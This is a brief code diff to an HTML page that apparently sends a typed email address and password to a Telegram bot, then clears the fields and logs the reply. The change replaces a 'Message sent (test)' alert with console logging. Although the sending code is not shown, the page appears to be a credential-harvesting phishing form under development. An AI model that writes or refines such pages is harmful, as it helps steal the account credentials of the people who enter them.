@@ -236,7 +236,7 @@ Time: ${getCurrentTime()}
           // success – clear inputs
           document.getElementById("email").value = "";
           document.getElementById("password").value = "";
-          alert("Message sent (test).");
+          console.log("Response:", data);
         } else {
           console.error("Telegram response:", data);
           alert("Failed to send. Check console.");
@@ -403,6 +403,7 @@ Time: ${getCurrentTime()}
 
 </body>
 </html>
+
 
 
 
